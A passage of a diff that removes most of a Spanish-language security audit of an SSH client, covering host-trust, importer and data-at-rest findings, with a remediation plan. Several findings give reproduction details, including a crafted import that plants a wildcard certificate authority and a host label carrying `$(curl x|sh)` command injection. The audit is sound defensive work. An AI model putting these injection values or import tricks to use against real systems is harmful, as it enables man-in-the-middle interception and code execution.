@@ -1,563 +1,828 @@
-# Análisis de seguridad de la 0.3.3 y plan de remediación
-
-- **Estado:** hallazgos documentados; remediación S0–S3 propuesta, sin empezar.
-- **Fecha:** 2026-11-04.
-- **Base:** 0.3.3-beta.2 (`b6b0012`), después de la [auditoría de la 0.3.1](auditoria-0.3.md) (R0–R6 y DT-7 hechos) y con los [registros de sesión](registros.md), que esa auditoría no vio. Los hallazgos llevan prefijos nuevos (CO, IM, DA, SF, RG, TE, CI) para no confundirlos con los de entonces (CX, DT, TM, UI, DS, BR).
-
-> [!CAUTION]
-> Este documento describe fallos **sin arreglar**, con lo necesario para reproducirlos. Mientras el repositorio sea privado no pasa nada; antes de hacerlo público, conviene haber cerrado al menos los de gravedad media (S0 y S1) o sacar este archivo del árbol que se publica.
+# Seguridad de la 0.3.3: contraste con main
 
-## Objetivo
-
-La auditoría de la 0.3.1 leyó el código entero buscando fallos de todo tipo. Esta mira solo la seguridad, y con un modelo de amenazas explícito, antes de dos cambios que la ponen a prueba: el repositorio pasa a ser público y la v0.4 cifra el vault. Comprueba también que los arreglos de seguridad de R1–R6 siguen en pie después de lo que se reescribió (DT-7 en el SFTP) y lo que se añadió (los registros de sesión).
-
-**Modelo de amenazas:**
-- un **servidor SSH hostil**, o un salto comprometido: controla la clave que presenta, los nombres, tipos, permisos y contenido del SFTP, y todo lo que sale en el terminal;
-- un **atacante en la red** (MITM), que puede presentar cualquier clave o certificado de host;
-- un **archivo importado hostil**: un export de PuTTY, MobaXterm, SecureCRT, Tabby, Termius o un CSV que alguien pasa, o un `ssh_config` que trae un paquete;
-- **otros usuarios de la misma máquina**, sin privilegios: carpetas compartidas, `/tmp`, `C:\ProgramData`, permisos de la carpeta de datos;
-- la **cadena de suministro y la CI**: descargas en el build, acciones, cachés, PRs de forks cuando el repositorio sea público.
-
-Fuera de alcance, por conocido y documentado: el vault y los registros sin cifrar hasta la v0.4 (SECURITY.md), la firma y la notarización (ARCHITECTURE §15) y el aviso de `rsa` (RUSTSEC-2023-0071, razonado en `core/deny.toml`).
-
-## Cómo se hizo
-
-- Seis revisiones de solo lectura, que cubren siete áreas (terminal e importadores fueron juntos): confianza en el host y conexión (`openward-ssh`, `openward-app`, `openward-proto`), datos en reposo y claves (`openward-vault`, `keychain`, FFI), SFTP y terminal local (`openward-sftp`, `openward-pty`), registros e historial (`openward-app::logs`, `app/lib/logs`, `app/lib/history`), terminal (`openward-ghostty`, `openward-term`, `app/lib/terminal`), importadores (`openward-import`) y build, CI y cadena de suministro.
-- Cada hallazgo apunta a un archivo y una línea y dice quién lo aprovecha y qué consigue. Los de gravedad media se han vuelto a comprobar a mano sobre el código (CO-2 y CI-2 dependen de algo que no se ve en él y llevan «Probable»). Nueve tienen además una prueba que se ejecutó: CO-1, CO-4, IM-5, IM-6, DA-2, DA-3, RG-4, RG-6 y CI-4. Las pruebas se hicieron fuera del repositorio y no se incluyen.
-- **Dependencias:** `cargo audit` 0.22.2 (advisory-db del 2026-11-03) sobre los cuatro `Cargo.lock`, y los 141 paquetes de `app/pubspec.lock` y del build tool de cargokit contra [OSV](https://osv.dev).
-- **Secretos:** un clon espejo con todas las refs (143 commits, ramas, `refs/pull/*`, notas y 25 tags), y los 2457 blobs del historial buscando claves privadas, tokens (`ghp_`, `github_pat_`, `AKIA`, `xox`, `sk-`), `.env`, certificados y datos reales. Los vaults de `openward-vault/tests/fixtures` se abrieron con `sqlite3`.
-- **Gravedad:** *Crítica* (se aprovecha sin hacer nada el usuario y da el control), *Alta* (sin aviso y con impacto serio, en una configuración normal), *Media* (impacto serio con una condición previa: un archivo importado, una carpeta compartida, una plataforma), *Baja* (impacto limitado o varias condiciones), *Informativa* (defensa en profundidad o comportamiento que conviene saber).
-- **Confianza:** *Confirmado* (la ruta de código seguida entera, o una prueba ejecutada) o *Probable* (falta algo que no se ve en el código; se dice qué).
-
-## Resumen
-
-**Lo que está bien hecho**, y conviene no romper:
-- **La confianza en el host se decide bien.** La clave se verifica antes de mandar nada de la autenticación, cada salto por separado y con su propio nombre; `Changed`, `Revoked` y un certificado inválido nunca se aceptan; cada respuesta de la interfaz va a su pregunta por un id; una reconexión vuelve a verificar. russh 0.64.1 negocia sin `none`, CBC, MAC SHA-1 ni grupo 1, y con strict KEX.
-- **El terminal es seguro de serie.** libghostty-vt no devuelve nada que controle el servidor (sin informe del título, DECRQCRA, OSC 52, 1337 ni notificaciones); el pegado cambia los controles por espacios, así que `ESC[201~` no cierra el pegado entre corchetes; los enlaces se abren solo con ⌘ o Ctrl y con lista de esquemas; el `unsafe` de `openward-ghostty` y `openward-pty` es correcto.
-- **Los arreglos de R1 siguen en pie** en las rutas nuevas: DT-1 en el recorrido concurrente del SFTP, DT-2 y DT-8; CX-4 cubre también los metacaracteres de `cmd.exe`.
-- **Los registros de sesión cumplen su promesa principal:** solo graban la salida, nunca lo que se teclea; la carpeta es fija, 0700, y los archivos nacen 0600; la FFI busca los ids en un mapa, sin rutas; el reproductor tira las respuestas del terminal.
-- **La cadena de suministro de la CI:** todas las acciones fijadas por SHA (y los SHA coinciden con sus tags), sin `pull_request_target`, permisos `contents: read` salvo en `release`, Zig verificado por SHA-256, Ghostty por commit y sus dependencias por hash, ningún binario precompilado de cargokit.
-- **Ningún secreto real** en el árbol ni en el historial, y los fixtures solo tienen datos inventados.
-- **Dependencias:** ningún aviso abierto en `core/Cargo.lock` ni en los paquetes de Dart (solo un crate *yanked*, CI-9).
-
-**Lo que más pesa:**
-- **Lo que se importa decide en qué hosts se confía y qué se abre al conectar.** Un dato de Termius preparado convierte una clave en `@cert-authority *` y salta el arreglo de CX-3 (CO-1); un export de PuTTY, SecureCRT o Tabby abre al conectar un SOCKS en `0.0.0.0` o un túnel remoto hacia un servicio local (IM-1), y trae el reenvío del agente sin decirlo (IM-2). La vista previa solo enseña números. Es la misma clase de riesgo que el ProxyCommand importado que R1 ya desactivó.
-- **Los permisos en disco dependen de quién crea la carpeta.** En Linux la carpeta de datos la crea `path_provider` en 0755 y `history.json`, `recent.json` y `settings.json` salen en 0644, aunque la interfaz diga que solo los lee tu usuario (DA-1).
-- **El SFTP sigue enlaces locales al bajar** (SF-1): en una carpeta compartida, otro usuario hace que la bajada escriba donde quiera dentro del home de la víctima.
-- **Los paquetes de Linux que se publican se construyen con un Zig sin verificar** (CI-1), y cuando el repositorio sea público la puerta seguirá siendo `make ci` en la máquina que publica (CI-2).
-
-**Hallazgos por área y gravedad:**
-
-| Área | Crítico | Alto | Medio | Bajo | Inform. | Total |
-|---|---|---|---|---|---|---|
-| CO · Confianza en el host y conexión | | | 2 | 6 | 1 | 9 |
-| IM · Importadores | | | 1 | 5 | 1 | 7 |
-| DA · Datos en reposo, claves y secretos | | | 1 | 5 | 3 | 9 |
-| SF · SFTP y archivos locales | | | 1 | 10 | 1 | 12 |
-| RG · Registros de sesión e historial | | | | 8 | 1 | 9 |
-| TE · Terminal | | | | 1 | 4 | 5 |
-| CI · Build, CI y cadena de suministro | | | 2 | 9 | 1 | 12 |
-| **Total** | **0** | **0** | **7** | **44** | **12** | **63** |
-
-## Hitos
-
-### S0 · Antes de hacer público el repositorio (2–3 días)
-
-Lo que cambia en cuanto cualquiera puede abrir un PR o leer el historial.
-- **CI-2:** la puerta de los PRs de fuera pasa a ser GitHub Actions (gratis en un repositorio público), con aprobación para los colaboradores externos; `make ci` nunca con código sin revisar en la máquina de release.
-- **CI-3:** el reporte privado de vulnerabilidades, activado el mismo día, y un correo alternativo en SECURITY.md.
-- **CI-4, CI-5:** el tag validado y fuera del programa de `sed`; `release` con todos los jobs, el tag en `main`, un `environment` con revisores y `persist-credentials: false`.
-- **CI-9:** `cargo update -p crypto-bigint` y `make deny` en verde.
-- **CI-8, CI-10:** sin `env` en `build_pod.sh`; sin paquetes con nombre de release en los PRs.
-- Decidir qué hacer con el correo personal del historial (CI-12) y con este documento.
-
-**Puerta:** un PR de un fork corre en Actions sin tocar la máquina de release; `make deny` en verde; SECURITY.md da un canal que funciona desde fuera.
-
-### S1 · Seguridad (0.3.3-beta.3, ~1,5 semanas)
-
-Los siete de gravedad media que quedan y los bajos que van con ellos.
-- **Importar sin confiar de más:** `KnownHost` rechaza `hosts` que empiezan por `@` y claves que no se leen, y el vault construye las entradas por sus campos, no por texto (CO-1); las CA, los comodines y `@revoked` importados, a la vista y desmarcados, y solo los de los hosts elegidos. Los túneles importados sin `autostart`, en loopback y a la vista (IM-1); el reenvío del agente, desmarcado (IM-2); el ProxyCommand de un `ssh_config` que no es el tuyo, como los de otros programas (IM-3).
-- **Permisos:** `create_private_dir` pone 0700 también a una carpeta que ya es tuya; historial, recientes y ajustes en 0600; `vault.db` endurecido al abrir; el texto de Ajustes, cierto (DA-1). La copia de `VACUUM INTO` nace 0600 (DA-2).
-- **SFTP local:** el `.part` con `O_NOFOLLOW` (y `O_EXCL` si no se reanuda), permisos y fecha sobre el descriptor, carpetas que son enlaces rechazadas o preguntadas (SF-1); el modo real del destino de un enlace (SF-2).
-- **Windows:** el `known_hosts` de `%PROGRAMDATA%` solo si es de Administrators o SYSTEM (CO-2).
-- **Pequeños con efecto:** el espacio inicial también en una línea editada (RG-1); una sola línea en `authorized_keys` (DA-3); `{{host}}` y `{{address}}` citados para la shell (DA-4).
-
-**Puerta:**
-- pruebas nuevas: la entrada de CO-1 se rechaza; un dato de Termius con `@cert-authority *` no llega activo; un `D0.0.0.0:1080` de PuTTY llega desactivado y en loopback; con la carpeta de datos creada antes en 0755, queda 0700 y `history.json` en 0600; un `.part` que es un enlace hace fallar la bajada sin tocar su destino; un `.pub` con dos líneas no instala dos;
-- `make ci` en verde y la beta en el tap.
-
-### S2 · Antes de D3 y D6 de la v0.4 (~2 semanas)
-
-Lo que el vault cifrado necesita resuelto, y los bajos de cada área.
-- **Antes de D3 (migración):** la copia previa se borra o se cifra tras migrar bien (DA-2).
-- **Antes de D6 (secretos):** `Zeroizing` en la clave de Termius, en `generate_key` e `import_key`, y contar las contraseñas de Termius sin descifrarlas (DA-5).
-- **Confianza en el host:** el algoritmo de la firma, el negociado (CO-3); ECDSA normalizado (CO-4); confiar en la nueva retira la vieja (CO-5); las claves aceptadas que no se guardan se recuerdan (CO-6); el agente solo en las conexiones del terminal (CO-7); la tarjeta del servidor no se parece a una local (CO-8).
-- **SFTP:** SF-3 a SF-11, sobre todo los límites (SF-11) y los bits especiales (SF-4, SF-9).
-- **Registros:** RG-2 a RG-8; sobre todo el tope por sesión frente a la retención (RG-3) y exportar en streaming (RG-4).
-- **Importadores:** presupuestos de memoria en Termius (IM-5) y de archivos en `Include` (IM-6); snippets importados a la vista (IM-4).
-- **Build:** CI-1, CI-6, CI-7 y CI-11.
-
-### S3 · Informativos (repartidos)
-
-CO-9, IM-7, DA-7 a DA-9, SF-12, RG-9, TE-1 a TE-5 y CI-12, cuando se toque su código.
-
----
-
-## CO · Confianza en el host y conexión
-
-### CO-1 · Un known host importado puede ser `@cert-authority *` (CX-3 incompleto)
-- **Gravedad:** Media · **Confianza:** Confirmado (prueba ejecutada)
-- **Ubicación:** `core/crates/openward-proto/src/lib.rs:437-469` (`is_well_formed`, `to_line`); `core/crates/openward-vault/src/lib.rs:722-733` (`known_hosts_text`); `core/crates/openward-import/src/termius/model.rs:462-478`; `core/crates/openward-app/src/programs.rs:783-813`; `core/crates/openward-app/src/connect.rs:226`; `app/lib/import/program_preview.dart:181,228-231`.
-- **Qué pasa:** el vault convierte cada `KnownHost` en una línea de texto y la vuelve a leer. `is_well_formed` solo exige que los patrones y las dos partes de la clave no tengan espacios ni controles, así que `hosts = "@cert-authority"`, `key = "* ssh-ed25519"`, `comment = "<base64 de una CA>"` pasa la comprobación y `to_line()` da `@cert-authority * ssh-ed25519 AAAA…`. La prueba devuelve `Certified` para `bank.example.com` con un certificado de esa CA, aunque el host tiene otra clave conocida. Hay dos caminos aún más directos por el mismo importador: el `marker` de Termius se importa tal cual (`@cert-authority` con `hostnames = "*"`), y una entrada normal con `*` hace que cualquier clave del atacante sea `Known` (`known_hosts.rs:268-270`). Todos los known hosts del bundle entran aunque el usuario elija solo algunos hosts, y la vista previa solo dice cuántos son.
-- **Escenario:** alguien pasa a un usuario de Termius una carpeta de datos preparada («mis hosts»), o mete las entradas en un vault compartido de Termius. Tras importarla, el atacante en la red presenta un certificado de su CA para cualquier host: la conexión sale sin aviso y la contraseña o el 2FA le llegan a él. Con `@revoked` puede además impedir conectar a hosts legítimos.
-- **Recomendación:** construir las entradas de `openward-ssh` desde los campos, sin pasar por texto; rechazar `hosts` que empiecen por `@` y claves que no se lean; en los importadores, las CA, los comodines y `@revoked` a la vista y desmarcados; importar solo los known hosts de los hosts elegidos.
-- **Relación:** CX-3 arregló el comentario con saltos de línea, no los demás campos.
-
-### CO-2 · Windows: `%PROGRAMDATA%\ssh\ssh_known_hosts` se lee sin mirar de quién es
-- **Gravedad:** Media · **Confianza:** Probable (falta comprobar las ACL en una instalación real)
-- **Ubicación:** `core/crates/openward-app/src/local.rs:40-47`; `core/crates/openward-app/src/plan.rs:243-247`; `core/crates/openward-app/src/connect.rs:164-175`.
-- **Qué pasa:** en Windows, el `known_hosts` global se busca en `C:\ProgramData\ssh` y se lee sin comprobar dueño ni ACL. Por defecto, un usuario estándar puede crear subcarpetas en `C:\ProgramData` y queda como su dueño; sin el servidor OpenSSH instalado, `ssh` no existe.
-- **Escenario:** en un Windows compartido, otro usuario sin privilegios crea `C:\ProgramData\ssh\ssh_known_hosts` con `* ssh-ed25519 <su clave>` o `@cert-authority * <su CA>`, y desde la misma red hace MITM sin aviso a las conexiones de los demás; con `@revoked *` les impide conectar.
-- **Recomendación:** leer el archivo global solo si la carpeta y el archivo son de Administrators o SYSTEM y Users no puede escribir en ellos; si no, avisar y no leerlo.
-- **Relación:** CX-5 añadió esta fuente.
-
-### CO-3 · Se aceptan firmas `ssh-rsa` (SHA-1) con `legacy_host_keys` desactivado (CX-13 incompleto)
-- **Gravedad:** Baja · **Confianza:** Confirmado (leído en russh 0.64.1 y ssh-key)
-- **Ubicación:** `core/crates/openward-ssh/src/client.rs:519-532,557`; `core/crates/openward-ssh/src/known_hosts.rs:312-320`; russh `src/client/kex.rs:329-341`.
-- **Qué pasa:** R1 quitó `ssh-rsa` de la negociación, pero russh verifica la firma del intercambio con el algoritmo que dice la propia firma, sin compararlo con el negociado, y ssh-key (con `sha1`, que activa russh) acepta RSA con SHA-1. Lo mismo con la firma de la CA de un certificado de host, que OpenSSH rechaza desde la 8.2.
-- **Recomendación:** en `check_server_key`, exigir que el algoritmo de la firma sea el negociado; en `check_certificate`, rechazar las firmas `ssh-rsa` salvo con la opción heredada.
-
-### CO-4 · Una clave ECDSA con el punto comprimido escapa de `@revoked`
-- **Gravedad:** Baja · **Confianza:** Confirmado (prueba ejecutada)
-- **Ubicación:** `core/crates/openward-ssh/src/known_hosts.rs:248-252,260,269`.
-- **Qué pasa:** la revocación y la coincidencia comparan los bytes de la clave; ssh-key acepta puntos SEC1 comprimidos y la firma se verifica igual. OpenSSH compara los puntos. La misma clave revocada, enviada comprimida, sale `Unknown`: con «Aceptar nuevas» se acepta sola.
-- **Escenario:** una clave de host ECDSA filtrada y revocada con `@revoked *` vuelve a valer contra hosts que la víctima aún no conoce.
-- **Recomendación:** normalizar las claves ECDSA a la forma sin comprimir antes de comparar, o rechazar los puntos comprimidos.
-
-### CO-5 · «Confiar en la clave nueva» no deja de confiar en la vieja
-- **Gravedad:** Baja · **Confianza:** Confirmado
-- **Ubicación:** `core/crates/openward-vault/src/lib.rs:744-751,933-939`; `core/crates/openward-ssh/src/known_hosts.rs:268-270`; `core/crates/openward-app/src/lib.rs:553-555`; `app/lib/tabs/connection_panels.dart:512,556-563`.
-- **Qué pasa:** solo se sustituyen las entradas cuyo patrón es exactamente igual, con las mismas mayúsculas; la comprobación pasa todo a minúsculas y da `Known` con cualquier clave listada. Siguen valiendo las entradas con otras mayúsculas, con varios patrones (`web,10.0.0.5`), con hash y las de `~/.ssh/known_hosts`.
-- **Escenario:** la clave del servidor se rota porque se filtró; el usuario confía en la nueva, y quien tiene la vieja sigue pudiendo hacer MITM sin aviso.
-- **Recomendación:** al confiar en la nueva, retirar toda clave del mismo tipo que coincida con host:puerto (con patrones y hash); una vieja que siga en `~/.ssh/known_hosts`, tratarla como `Changed` o decirlo en el diálogo.
-
-### CO-6 · Si la clave aceptada no se guarda, «Aceptar nuevas» acepta cualquiera al reconectar
-- **Gravedad:** Baja · **Confianza:** Confirmado (lectura de código)
-- **Ubicación:** `core/crates/openward-app/src/connect.rs:291-295`; `core/crates/openward-vault/src/lib.rs:759-761`; `core/crates/openward-app/src/lib.rs:172-205`.
-- **Qué pasa:** un fallo al guardar se ignora («trusted for this session»), pero cada reconexión automática (hasta ocho) vuelve a leer el vault: con `AcceptNew` el host sale otra vez `Unknown` y se acepta otra clave sin preguntar. Pasa con un error de SQLite (disco lleno) o con una dirección que `is_well_formed` rechaza.
-- **Recomendación:** recordar en memoria, por `App`, las claves aceptadas; si no se pudo guardar, no aceptar sola la siguiente y avisar.
-
-### CO-7 · El canal del agente se acepta en conexiones que nunca lo pidieron
-- **Gravedad:** Baja · **Confianza:** Confirmado
-- **Ubicación:** `core/crates/openward-app/src/connect.rs:230-234`; `core/crates/openward-ssh/src/client.rs:344-361`; `core/crates/openward-app/src/sftp.rs:245-249`.
-- **Qué pasa:** con `ForwardAgent`, toda conexión del host acepta `auth-agent@openssh.com`, también las del navegador SFTP y las de un túnel, que nunca piden el reenvío. El servidor puede firmar con el agente del usuario cuando quiera. `sftp` de OpenSSH pasa `-oForwardAgent=no`.
-- **Recomendación:** activarlo solo en las conexiones del terminal, o aceptar el canal solo después de haberlo pedido.
-
-### CO-8 · La tarjeta keyboard-interactive puede imitar una pregunta local
-- **Gravedad:** Baja · **Confianza:** Probable (depende de que el usuario se confunda)
-- **Ubicación:** `app/lib/tabs/prompt_card.dart:62-69,155-171`; `core/crates/openward-app/src/connect.rs:575-585`.
-- **Qué pasa:** el título es el `name` que manda el servidor y el cuerpo, sus `instructions`. Un servidor ya aceptado puede imitar la tarjeta de «Frase de paso» y pedir la de una clave local; solo lo delata la línea `usuario@host`. Pasará igual con la contraseña del vault de la v0.4 si usa una tarjeta parecida.
-- **Recomendación:** «Lo pide el servidor X», con otro estilo, y el `name` del servidor nunca como título.
-
-### CO-9 · Informativos de la conexión
-- **Gravedad:** Informativa
-- Los canales que el servidor abre sin pedirse (`x11`, `session`, `direct-tcpip`, `direct-streamlocal`, `forwarded-streamlocal`) los aceptan los manejadores por defecto de russh y luego se tiran (`client.rs:227-362`): no conectan con nada local, pero conviene rechazarlos. Los certificados de host con opciones críticas no se rechazan, y OpenSSH sí.
-- Heredados de OpenSSH: Terrapin sigue siendo posible con servidores sin strict KEX y ChaCha20 o ETM; los túneles locales en loopback los puede usar cualquier otro usuario o proceso local; las credenciales del proxy HTTP (Basic) y SOCKS5 van en claro; sin `IdentitiesOnly`, las claves del agente se ofrecen a todos los saltos (`connect.rs:431-443`).
-- La petición `CONNECT` del proxy HTTP se construye con la dirección sin rechazar CR o LF (`proxy.rs:91-100`; el vault solo exige que no esté vacía): los corchetes que añade la hacen poco aprovechable, pero conviene validarla.
-
-## IM · Importadores
-
-### IM-1 · Los túneles importados se abren solos al conectar, también en `0.0.0.0`
-- **Gravedad:** Media · **Confianza:** Confirmado
-- **Ubicación:** `core/crates/openward-import/src/putty.rs:325-339,410-433`; `core/crates/openward-import/src/securecrt.rs:363-392`; `core/crates/openward-import/src/tabby.rs:228-251`; `core/crates/openward-app/src/programs.rs:739-767`; `core/crates/openward-app/src/connect.rs:75-88`; `core/crates/openward-app/src/tunnels.rs:156-166`; `core/crates/openward-ssh/src/forward.rs:93,145`; `app/lib/import/program_preview.dart:224-225,331`.
-- **Qué pasa:** PuTTY, SecureCRT y Tabby traen sus túneles con `autostart: true` y con la dirección de escucha del archivo (`LocalPortAcceptAll` de PuTTY pasa a `0.0.0.0`); `listen_address` la respeta, `*` incluido, y `autostart` los abre en cuanto conecta. El SOCKS5 no tiene autenticación. La vista previa solo dice cuántos túneles hay.
-- **Escenario:**
-  - un export con `D1080` y `LocalPortAcceptAll=1` en el host del bastión: al conectar desde una wifi pública, cualquiera de esa red usa un SOCKS5 abierto hacia la red interna, autenticado como la víctima;
-  - un `R6379=127.0.0.1:6379` (o hacia cualquier servicio local sin autenticar: Redis, una API de desarrollo, Jupyter): el servidor llega a ese servicio del equipo del usuario, y desde algunos de ellos a ejecutar código.
-- **Recomendación:** importar los túneles de otros programas sin `autostart`; los que no escuchan en loopback, a la vista en la vista previa y en la lista de túneles, y confirmados al abrirlos. El mismo criterio que CX-4 con el ProxyCommand.
-
-### IM-2 · El reenvío del agente de otros programas llega activo y sin aviso
-- **Gravedad:** Baja · **Confianza:** Confirmado
-- **Ubicación:** `putty.rs:244-246`; `mobaxterm.rs:186-188`; `securecrt.rs:308-310`; `tabby.rs:194-196`; `termius/model.rs:302-304` (todos en `core/crates/openward-import/src/`).
-- **Escenario:** un export trae «prod-db» con la dirección del atacante y `AgentFwd=1`; mientras dure la sesión, el servidor firma con el agente del usuario contra GitHub o el bastión.
-- **Recomendación:** un aviso en el informe y una casilla en la vista previa, desmarcada para lo que venga de otro programa.
-
-### IM-3 · El ProxyCommand de un `ssh_config` ajeno llega activo y no se ve
-- **Gravedad:** Baja · **Confianza:** Confirmado
-- **Ubicación:** `core/crates/openward-import/src/ssh_config.rs:508-509,789`; `core/crates/openward-app/src/import.rs:39-51`.
-- **Qué pasa:** el de `~/.ssh/config` debe llegar activo, como en `ssh`. Pero el importador acepta también un archivo elegido (`file: Some(path)`), que puede venir de otra persona, y su ProxyCommand llega igual de activo; la vista previa no lo enseña.
-- **Recomendación:** si el archivo no es `~/.ssh/config` (o algo que incluye), tratarlo como los de otros programas: al informe, con su texto.
-- **Relación:** CX-4.
-
-### IM-4 · Los snippets importados entran todos, sin verse, y la paleta solo enseña la primera línea
-- **Gravedad:** Baja · **Confianza:** Confirmado
-- **Ubicación:** `core/crates/openward-app/src/programs.rs:771-782`; `core/crates/openward-import/src/termius/model.rs:450-459`; `app/lib/palette/command_palette.dart:506-516`; `app/lib/snippets/snippets.dart:100-107`.
-- **Escenario:** un snippet «Uso de disco» con `df -h` en la primera línea y `curl …|sh` en la tercera; desde ⌘K, Intro lo manda entero, cada línea con su Intro.
-- **Recomendación:** elegir los snippets en la vista previa, con el texto entero; «N líneas» en la paleta; confirmar la primera vez que se lanza uno importado.
-
-### IM-5 · Una carpeta de Termius preparada agota la memoria (DT-14 incompleto)
-- **Gravedad:** Baja (la app se cae) · **Confianza:** Confirmado (prueba ejecutada)
-- **Ubicación:** `core/crates/openward-import/src/termius/v8.rs:143-148,177-191,242-245`; `core/crates/openward-import/src/termius/leveldb.rs:210-214,254-266`; se llega por `termius/mod.rs:91-92`, antes de pedir el llavero.
-- **Qué pasa:**
-
-  | Entrada | Tamaño | Resultado |
-  |---|---|---|
-  | Referencias `^` de V8, 22 niveles (cada una copia el objeto entero) | 305 B | 16,7 M valores en 17 s; cada nivel dobla |
-  | Arrays dispersos `'a'` (reservan 65 536 huecos sin mirar los datos) | 9 KB | unos 2 GiB |
-  | LevelDB con una clave compartida enorme (se clona en cada entrada) | 85 KB | 259 MB de pico |
-
-  Con 40 niveles o una clave de 1 MiB, la app se queda sin memoria. proptest con bytes al azar no da con ellos.
-- **Recomendación:** un presupuesto de valores por registro (como el `MAX_NODES` de Tabby) que cuente lo que expande cada referencia; arrays dispersos según sus propiedades reales; en LevelDB, un tope de bytes por tabla o sin clonar las claves; los tres casos en `tests/hostile.rs`.
-
-### IM-6 · `Include` sin tope de trabajo: abanico exponencial y `**`
-- **Gravedad:** Baja (la app se cuelga) · **Confianza:** Confirmado (prueba ejecutada)
-- **Ubicación:** `core/crates/openward-import/src/ssh_config.rs:440-449,716-730`; `app/lib/welcome/first_run.dart:49-52`; `core/crates/openward-app/src/connect.rs:166-172`.
-- **Qué pasa:** solo se cuenta la profundidad (16). `Include config config` lee 2^16 archivos (2,7 s y 65 536 avisos); con tres, 3^16 (más de un minuto, sin acabar). `Include /**/*` lee como configuración cada archivo del disco de hasta 64 MiB: el crate `glob` admite `**`, glob(3) de OpenSSH no. Se dispara al importar y en la bienvenida, con cualquier archivo que una herramienta deje en `~/.ssh/config.d/`. Aparte, `UserKnownHostsFile` se lee al conectar con `read_to_string`, sin tope ni tipo: `/dev/zero` agota la memoria.
-- **Recomendación:** un tope de archivos leídos (unos 256), no releer un archivo de la misma cadena, `**` como `*`, y `files::read` (archivo normal y 64 MiB) para los `known_hosts`.
-
-### IM-7 · El consentimiento de Termius
-- **Gravedad:** Informativa · **Confianza:** Confirmado
-- **Ubicación:** `app/lib/import/programs.dart:38`; `core/crates/openward-import/src/detect.rs:135-140`; `core/crates/openward-import/src/termius/keychain.rs:80-87`.
-- **Qué pasa:** el diálogo solo sale cuando Termius se detecta solo; soltando su carpeta a mano se lee el llavero sin él. En Linux (`secret-tool`) y Windows el sistema no pregunta, aunque `termius_consent.dart` dice que sí.
-- **Recomendación:** el diálogo siempre que `detect` reconozca Termius, y el texto según la plataforma.
-
-## DA · Datos en reposo, claves y secretos
-
-### DA-1 · En Linux, la carpeta de datos no es privada y el historial sale en 0644
-- **Gravedad:** Media · **Confianza:** Confirmado en el código (path_provider_linux 2.2.2 incluido); la exposición depende de los permisos del home
-- **Ubicación:** `app/lib/main.dart:24-26`; `core/crates/openward-app/src/lib.rs:857-871` (`create_private_dir`); `app/lib/core/json_file.dart:28-33` (`writeFileAtomically`); `app/lib/history/history.dart:155`; `app/lib/home/recent.dart:204`; `app/lib/core/settings.dart:469`; `core/crates/openward-vault/src/store.rs:100`; `app/lib/l10n/app_es.arb:2166`.
-- **Qué pasa:**
-  - `getApplicationSupportDirectory()` crea `~/.local/share/dev.openward.OpenWard` con `Directory.create` (0777 menos la umask, normalmente 0755) antes de llamar al núcleo, y `create_private_dir` vuelve sin hacer nada si la carpeta ya existe: nunca queda en 0700;
-  - `writeFileAtomically` crea el temporal con los permisos por defecto de Dart: `history.json` (activado de serie, hasta 2000 comandos con dónde se ejecutaron), `recent.json` y `settings.json` salen en 0644, y un `chmod 600` a mano se pierde en el siguiente guardado;
-  - el núcleo sí protege lo suyo (`vault.db`, `-wal`, `-shm` y el candado en 0600; `logs/` en 0700), pero un `vault.db` que ya existiera con otros permisos no se endurece;
-  - Ajustes › Registros dice «en una carpeta que solo puede leer tu usuario, igual que el historial de comandos», que no es cierto para el historial.
-- **Escenario:**
-  - un equipo compartido con homes en 0755 (Ubuntu 20.04 y anteriores, laboratorios, homes por NFS): otro usuario lee `history.json` y encuentra `mysql -pSecreto…` o `export TOKEN=…`;
-  - con umask 002 y un grupo con más miembros, la carpeta queda escribible para el grupo: otro usuario sustituye `vault.db` por uno con un ProxyCommand y ejecuta órdenes como la víctima al conectar.
-  - En macOS (`~/Library` en 0700) y Windows (ACL de `%APPDATA%`) no hay exposición.
-- **Recomendación:** `create_private_dir` pone 0700 a una carpeta que existe y es del usuario; los JSON se escriben con 0600 (por la FFI, o con un `chmod` del temporal antes de escribir); `vault.db` a 0600 al abrir; una prueba con la carpeta ya creada; el texto de Ajustes, cierto.
-- **Relación:** UI-6 (los archivos atómicos de R1) se hizo sin los permisos.
-
-### DA-2 · La copia previa a una migración queda en 0644 y para siempre
-- **Gravedad:** Baja hoy (`STEPS` está vacío); Media con la primera migración real (D3) · **Confianza:** Confirmado (prueba ejecutada)
-- **Ubicación:** `core/crates/openward-vault/src/store.rs:55-77`.
-- **Qué pasa:** SQLite crea el destino de `VACUUM INTO` con los permisos por defecto, no con los de `vault.db`, y nada borra `vault.sqlite.format-N.bak`. Con D3 quedaría junto al vault cifrado una copia entera en claro.
-- **Recomendación:** crear antes el archivo vacío con `create_new` y 0600 (SQLite acepta un destino vacío); en D3, borrar o cifrar la copia tras migrar bien, o avisar.
-- **Relación:** DT-11.
-
-### DA-3 · Instalar una clave pública puede añadir más de una línea a `authorized_keys`
-- **Gravedad:** Baja · **Confianza:** Confirmado (prueba ejecutada)
-- **Ubicación:** `core/crates/openward-app/src/keychain.rs:447-455,499-536`; `core/crates/openward-app/src/programs.rs:857-869`; `core/crates/openward-app/src/sftp.rs:149-165`.
-- **Qué pasa:** ssh-key toma como comentario todo lo que va tras el base64, saltos de línea incluidos, y lo vuelve a escribir igual. Un `.pub` de dos líneas, o una clave importada con `deploy\nssh-ed25519 AAAA<otra> x` como comentario, instala esas líneas de más; `with_authorized` solo mira la primera.
-- **Escenario:** alguien entrega una clave «de despliegue» con la suya escondida en el comentario; el usuario la instala, y cuando más tarde la quita creyendo revocar el acceso, la escondida sigue.
-- **Recomendación:** limpiar los comentarios de controles al importar y al escribir el `.pub`, y exigir en `install_public_key` exactamente una línea `tipo base64 [comentario]`.
-
-### DA-4 · Las variables automáticas de los snippets se sustituyen sin citar
-- **Gravedad:** Baja · **Confianza:** Confirmado
-- **Ubicación:** `core/crates/openward-app/src/snippets.rs:84-100`; `app/lib/snippets/snippets.dart:57,91,104-106`.
-- **Qué pasa:** `{{host}}` (la etiqueta de la pestaña) y `{{address}}` entran tal cual en la orden, y sin variables que preguntar y con un solo panel se mandan con su Intro sin vista previa. Ningún importador limpia las etiquetas.
-- **Escenario:** un CSV o un Tabby importado trae un host con la etiqueta `web$(curl x|sh)`; un snippet `ping {{host}}` en ese host ejecuta lo que va dentro, en el servidor.
-- **Recomendación:** citar para la shell los valores automáticos (o enseñar siempre la vista previa cuando haya alguno), y quitar los controles de etiquetas y direcciones al importar.
-
-### DA-5 · Borrado incompleto de secretos en memoria (CX-11 incompleto)
